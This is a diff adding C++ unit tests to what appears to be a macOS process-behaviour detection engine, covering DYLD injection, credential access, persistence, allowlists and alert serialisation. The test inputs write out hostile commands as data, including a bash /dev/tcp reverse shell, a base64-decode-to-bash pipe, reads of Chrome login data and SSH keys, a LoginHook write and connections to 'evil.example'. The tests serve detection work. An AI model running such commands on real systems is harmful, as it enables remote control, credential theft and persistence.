@@ -1,5 +1,6 @@
 #include "test_framework.h"
 
+#include "behavior/alert_store.h"
 #include "behavior/engine.h"
 #include "behavior/es_parser.h"
 #include "behavior/net_util.h"
@@ -682,4 +683,278 @@ TEST(engine_net_conditions_public_and_port) {
     CHECK(n->hit_ids.count("r.priv") == 0);
     CHECK(n->hit_ids.count("r.port") == 1);
     CHECK(n->hit_ids.count("r.notport") == 1);
+}
+
+namespace {
+
+bool hit(Engine& e, int pid, const std::string& id) {
+    const ProcNode* n = e.tree().find(pid);
+    return n != nullptr && n->hit_ids.count(id) != 0;
+}
+
+std::string exec_line(int pid, int ppid, const std::string& path, const std::string& args_json,
+                      const std::string& signing, long long t, const std::string& env_json = "") {
+    std::string s = R"({"type":"exec","time_ms":)" + std::to_string(t) + R"(,"pid":)" + std::to_string(pid) +
+                    R"(,"ppid":)" + std::to_string(ppid) + R"(,"path":")" + path + R"(","args":)" + args_json +
+                    R"(,"signing":")" + signing + R"(")";
+    if (!env_json.empty()) s += R"(,"env":)" + env_json;
+    return s + "}";
+}
+
+RuleSet default_plus(const char* overlay_json) {
+    RuleSet rs = default_ruleset();
+    RuleSet overlay;
+    std::string err;
+    const bool ok = load_ruleset_text(overlay_json, overlay, &err);
+    CHECK(ok);
+    if (!ok) return rs;
+    merge_ruleset(rs, overlay);
+    return rs;
+}
+
+}
+
+TEST(parser_keeps_only_dyld_environment) {
+    const ParseResult r = parse_event_line(
+        R"({"event":{"exec":{"target":{"audit_token":{"pid":900},"ppid":1,"executable":{"path":"/tmp/inj"},)"
+        R"("signing_id":"","team_id":"","is_platform_binary":false,"codesigning_flags":2},"args":["/tmp/inj"],)"
+        R"("env":["PATH=/usr/bin","DYLD_INSERT_LIBRARIES=/tmp/evil.dylib","SECRET=abc"]}},)"
+        R"("time":"2026-11-06T00:00:00.000Z"})");
+    CHECK(r.ok());
+    CHECK(r.event.proc.env.size() == 1);
+    if (!r.event.proc.env.empty()) CHECK(r.event.proc.env[0] == "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib");
+
+    const ParseResult n = parse_event_line(exec_line(901, 1, "/opt/a", R"(["a"])", "unsigned", 5,
+                                                     R"(["HOME=/x","DYLD_FORCE_FLAT_NAMESPACE=1"])"));
+    CHECK(n.ok());
+    CHECK(n.event.proc.env.size() == 1);
+}
+
+TEST(rule_dyld_insert) {
+    Engine e(default_ruleset());
+    const auto a = feed(e, exec_line(910, 1, "/tmp/inj", R"(["/tmp/inj"])", "unsigned", 1000,
+                                     R"(["DYLD_INSERT_LIBRARIES=/tmp/evil.dylib"])"));
+    CHECK(a.size() == 1);
+    if (a.size() == 1) {
+        CHECK(has_rule(a[0], "mac.exec.dyld_insert"));
+        CHECK(has_rule(a[0], "mac.exec.unsigned_from_tmp"));
+        CHECK(a[0].score == 80);
+    }
+    // Same environment on its own is only a 40 point signal.
+    const auto b = feed(e, exec_line(911, 1, "/usr/bin/true", R"(["true"])", "platform", 2000,
+                                     R"(["DYLD_INSERT_LIBRARIES=/Applications/Xcode.app/x.dylib"])"));
+    CHECK(b.empty());
+    CHECK(hit(e, 911, "mac.exec.dyld_insert"));
+    // Without the variable nothing fires.
+    feed(e, exec_line(912, 1, "/usr/bin/true", R"(["true"])", "platform", 3000));
+    CHECK(!hit(e, 912, "mac.exec.dyld_insert"));
+}
+
+TEST(rules_credential_login_hook_base64_jxa) {
+    Engine e(default_ruleset());
+    feed(e, exec_line(920, 1, "/bin/zsh", R"(["zsh"])", "platform", 1000));
+    feed(e, exec_line(921, 920, "/bin/cp",
+                      R"(["cp","/Users/a/Library/Application Support/Google/Chrome/Default/Login Data","/tmp/l"])",
+                      "platform", 2000));
+    CHECK(hit(e, 921, "mac.exec.browser_data_access"));
+    feed(e, exec_line(922, 920, "/bin/cat", R"(["cat","/Users/a/.ssh/id_ed25519"])", "platform", 3000));
+    CHECK(hit(e, 922, "mac.exec.ssh_key_access"));
+    feed(e, exec_line(923, 920, "/usr/bin/defaults",
+                      R"(["defaults","write","com.apple.loginwindow","LoginHook","/tmp/x.sh"])", "platform", 4000));
+    CHECK(hit(e, 923, "mac.exec.login_hook"));
+    feed(e, exec_line(924, 920, "/bin/bash", R"(["bash","-c","echo aGk= | base64 -d | bash"])", "platform", 5000));
+    CHECK(hit(e, 924, "mac.exec.base64_shell"));
+    feed(e, exec_line(925, 920, "/usr/bin/osascript", R"(["osascript","-l","JavaScript","-e","1"])", "platform", 6000));
+    CHECK(hit(e, 925, "mac.exec.jxa"));
+
+    // Harmless look-alikes.
+    feed(e, exec_line(926, 920, "/bin/cat", R"(["cat","/Users/a/notes.txt"])", "platform", 7000));
+    CHECK(!hit(e, 926, "mac.exec.ssh_key_access"));
+    feed(e, exec_line(927, 920, "/bin/bash", R"(["bash","-c","echo hi | base64"])", "platform", 8000));
+    CHECK(!hit(e, 927, "mac.exec.base64_shell"));
+}
+
+TEST(rules_file_app_bundle_and_authorized_keys) {
+    Engine e(default_ruleset());
+    feed(e, exec_line(930, 1, "/opt/dropper", R"(["dropper"])", "unsigned", 1000));
+    feed(e, R"({"type":"file_modify","time_ms":2000,"pid":930,"path":"/opt/dropper","file":"/Applications/Foo.app/Contents/MacOS/Foo","signing":"unsigned"})");
+    CHECK(hit(e, 930, "mac.file.app_bundle_tamper"));
+
+    feed(e, exec_line(931, 1, "/Applications/Updater.app/Contents/MacOS/u", R"(["u"])", "team:ABCDE12345", 3000));
+    feed(e, R"({"type":"file_modify","time_ms":4000,"pid":931,"path":"/Applications/Updater.app/Contents/MacOS/u","file":"/Applications/Foo.app/Contents/MacOS/Foo","signing":"team:ABCDE12345"})");
+    CHECK(!hit(e, 931, "mac.file.app_bundle_tamper"));
+
+    feed(e, exec_line(932, 1, "/usr/bin/curl", R"(["curl","x"])", "platform", 5000));
+    feed(e, R"({"type":"file_modify","time_ms":6000,"pid":932,"path":"/usr/bin/curl","file":"/Users/a/.ssh/authorized_keys","signing":"platform"})");
+    CHECK(hit(e, 932, "mac.persist.authorized_keys_script"));
+}
+
+TEST(allowlist_validation) {
+    RuleSet rs;
+    std::string err;
+    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x"}]})", rs, &err));
+    CHECK(err.find("allow everything") != std::string::npos);
+    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x","rules":["a"],"bogus":1}]})", rs, &err));
+    CHECK(err.find("unknown key") != std::string::npos);
+    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x","rules":["a"]},{"id":"x","rules":["b"]}]})", rs, &err));
+    CHECK(err.find("duplicate") != std::string::npos);
+    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x","when":{"requires_tag_any":["staged"]}}]})", rs, &err));
+    CHECK(!load_ruleset_text(R"({"allowlist":[{"id":"x","event":"smtp","rules":["a"]}]})", rs, &err));
+    CHECK(!load_ruleset_text(R"({"allowlist":{}})", rs, &err));
+    CHECK(load_ruleset_text(R"({"allowlist":[{"rules":["a.*"]},{"event":"net"},{"when":{"team_id_any":["ABC"]}}]})",
+                            rs, &err));
+    CHECK(rs.allowlist.size() == 3);
+    CHECK(rs.allowlist[0].id == "allow#1");
+    CHECK(rs.allowlist[2].when.team_id_any.size() == 1 && rs.allowlist[2].when.team_id_any[0] == "abc");
+}
+
+TEST(allowlist_suppresses_matching_hits_only) {
+    const char* kOverlay = R"({"allowlist":[
+        {"id":"corp-tool","note":"internal helper","rules":["mac.exec.reverse_shell_args"],
+         "when":{"path_prefix_any":["/opt/corp/"]}}]})";
+    Engine plain(default_ruleset());
+    Engine e(default_plus(kOverlay));
+    const std::string args = R"(["sh","-c","exec 3<>/dev/tcp/10.0.0.1/80"])";
+
+    CHECK(feed(plain, exec_line(940, 1, "/opt/corp/tool", args, "unsigned", 1000)).size() == 1);
+
+    CHECK(feed(e, exec_line(940, 1, "/opt/corp/tool", args, "unsigned", 1000)).empty());
+    CHECK(e.suppressed() == 1);
+    CHECK(!hit(e, 940, "mac.exec.reverse_shell_args"));
+    CHECK(e.tree().find(940)->score == 0);
+
+    const auto other = feed(e, exec_line(941, 1, "/opt/other/tool", args, "unsigned", 2000));
+    CHECK(other.size() == 1);
+    CHECK(e.suppressed() == 1);
+}
+
+TEST(allowlist_prefix_patterns_team_id_and_hosts) {
+    const char* kOverlay = R"({"rules":[
+        {"id":"mac.net.test_any","title":"any public connect","event":"net","score":10,"when":{"remote_public":true}}],
+        "allowlist":[
+        {"id":"vendor","rules":["mac.net.*"],"when":{"team_id_any":["ABCDE12345"]}},
+        {"id":"corp-hosts","event":"net","when":{"remote_host_any":["*.corp.example"],"name_any":["bash"]}},
+        {"id":"lab-range","rules":["mac.net.shell_connect"],"when":{"remote_ip_any":["198.51.100.0/24"]}}]})";
+    Engine e(default_plus(kOverlay));
+
+    // Signed vendor app: every mac.net.* rule is skipped.
+    feed(e, exec_line(950, 1, "/opt/vendor/agent", R"(["agent"])", "team:ABCDE12345", 1000));
+    feed(e, R"({"type":"net","time_ms":2000,"pid":950,"path":"/opt/vendor/agent","remote_ip":"203.0.113.9","remote_port":4444,"signing":"team:ABCDE12345"})");
+    CHECK(e.tree().find(950)->score == 0);
+    CHECK(e.suppressed() >= 1);
+
+    // Same traffic from an unsigned binary is not covered.
+    feed(e, exec_line(951, 1, "/tmp/agent", R"(["agent"])", "unsigned", 3000));
+    feed(e, R"({"type":"net","time_ms":4000,"pid":951,"path":"/tmp/agent","remote_ip":"203.0.113.9","remote_port":4444,"signing":"unsigned"})");
+    CHECK(e.tree().find(951)->score > 0);
+
+    // bash to an allowed host pattern vs. another host.
+    feed(e, exec_line(952, 1, "/bin/bash", R"(["bash"])", "platform", 5000));
+    feed(e, R"({"type":"net","time_ms":6000,"pid":952,"path":"/bin/bash","remote_ip":"203.0.113.9","remote_port":22,"remote_host":"git.corp.example","signing":"platform"})");
+    CHECK(!hit(e, 952, "mac.net.shell_connect"));
+    feed(e, exec_line(953, 1, "/bin/bash", R"(["bash"])", "platform", 7000));
+    feed(e, R"({"type":"net","time_ms":8000,"pid":953,"path":"/bin/bash","remote_ip":"203.0.113.9","remote_port":22,"remote_host":"evil.example","signing":"platform"})");
+    CHECK(hit(e, 953, "mac.net.shell_connect"));
+
+    // CIDR on remote_ip_any (only the named rule is skipped).
+    feed(e, exec_line(954, 1, "/bin/bash", R"(["bash"])", "platform", 9000));
+    feed(e, R"({"type":"net","time_ms":10000,"pid":954,"path":"/bin/bash","remote_ip":"198.51.100.7","remote_port":22,"signing":"platform"})");
+    CHECK(!hit(e, 954, "mac.net.shell_connect"));
+}
+
+TEST(allowlist_merge_appends_overlay_entries) {
+    RuleSet base = default_ruleset();
+    CHECK(base.allowlist.empty());
+    RuleSet a, b;
+    CHECK(load_ruleset_text(R"({"allowlist":[{"id":"one","rules":["x"]}]})", a, nullptr));
+    CHECK(load_ruleset_text(R"({"allowlist":[{"id":"two","rules":["y"]}]})", b, nullptr));
+    merge_ruleset(base, a);
+    merge_ruleset(base, b);
+    CHECK(base.allowlist.size() == 2);
+}
+
+TEST(alert_has_recent_activity_and_suspect_files) {
+    Engine e(default_ruleset());
+    const auto alerts = feed_all(e, kChain);
+    CHECK(!alerts.empty());
+    const Alert& last = alerts.back();
+    CHECK(!last.context.empty());
+    CHECK(last.context.size() <= 12);
+    CHECK(last.context.back().rfind("T+0.0s", 0) == 0);
+    bool saw_exec = false;
+    for (const std::string& c : last.context) {
+        if (c.find("exec /tmp/.x") != std::string::npos) saw_exec = true;
+    }
+    CHECK(saw_exec);
+    CHECK(std::find(last.suspect_paths.begin(), last.suspect_paths.end(), "/tmp/.x") != last.suspect_paths.end());
+    CHECK(last.suspect_paths.size() <= 4);
+
+    // Activity of unrelated processes must not leak into the context.
+    Engine e2(default_ruleset());
+    feed(e2, exec_line(960, 1, "/usr/bin/vim", R"(["vim"])", "platform", 100));
+    feed(e2, exec_line(961, 1, "/bin/zsh", R"(["zsh"])", "platform", 200));
+    const auto a2 = feed(e2, exec_line(962, 961, "/bin/bash", R"(["bash","-c","bash -i >& /dev/tcp/1.2.3.4/9 0>&1"])",
+                                       "platform", 300));
+    CHECK(a2.size() == 1);
+    if (a2.size() == 1) {
+        for (const std::string& c : a2[0].context) CHECK(c.find("vim") == std::string::npos);
+    }
+}
+
+TEST(alert_tsv_keeps_context_files_and_reads_old_lines) {
+    Alert a;
+    a.time_ms = 1000;
+    a.level = 2;
+    a.score = 120;
+    a.pid = 7;
+    a.process_path = "/tmp/x";
+    a.title = "t";
+    a.detail = "d";
+    a.context = {"T-1.0s  a(1)  exec /bin/a", "T+0.0s  b(2)  create /tmp/y"};
+    a.files = {"/tmp/x  sha256:abc  1.0 KB  이상 없음"};
+    const std::string line = alert_to_tsv(a);
+    Alert b;
+    CHECK(alert_from_tsv(line, b));
+    CHECK(b.context == a.context);
+    CHECK(b.files == a.files);
+
+    // 10-field lines written by older versions still load.
+    const std::string old_line = line.substr(0, line.rfind('\t', line.rfind('\t') - 1));
+    Alert c;
+    CHECK(alert_from_tsv(old_line, c));
+    CHECK(c.context.empty() && c.files.empty());
+    CHECK(c.title == "t");
+
+    const auto doc = json::parse(alert_to_json(a));
+    CHECK(doc.has_value());
+    CHECK((*doc)["context"].items().size() == 2);
+    CHECK((*doc)["files"].items().size() == 1);
+}
+
+TEST(engine_seed_process_keeps_signing_and_ancestry) {
+    Engine e(default_ruleset());
+    ProcessRef sh;
+    sh.pid = 970;
+    sh.ppid = 1;
+    sh.path = "/tmp/old_implant";
+    sh.sig_known = true;  // unsigned: no team id, not platform
+    e.seed_process(sh, 100);
+    CHECK(e.seeded() == 1);
+    const ProcNode* n = e.tree().find(970);
+    CHECK(n != nullptr && n->is_unsigned());
+    CHECK(e.events_processed() == 0);  // seeding evaluates nothing
+
+    // A later event that only knows the pid must not erase what the snapshot learned.
+    feed(e, R"({"type":"net","time_ms":200,"pid":970,"path":"/tmp/old_implant","remote_ip":"203.0.113.9","remote_port":4444})");
+    n = e.tree().find(970);
+    CHECK(n != nullptr && n->sig_known && n->is_unsigned());
+    CHECK(hit(e, 970, "mac.net.unsigned_public"));
+    CHECK(hit(e, 970, "mac.net.unsigned_uncommon_port"));
+
+    // Its children are tracked under it.
+    feed(e, exec_line(971, 970, "/bin/sh", R"(["sh"])", "platform", 300));
+    const auto chain = e.tree().chain(971);
+    CHECK(chain.size() >= 2);
+    if (chain.size() >= 2) CHECK(chain[1]->pid == 970);
+    CHECK(e.tree().find(971)->score >= 35);  // inherited from the seeded parent's later hits
 }
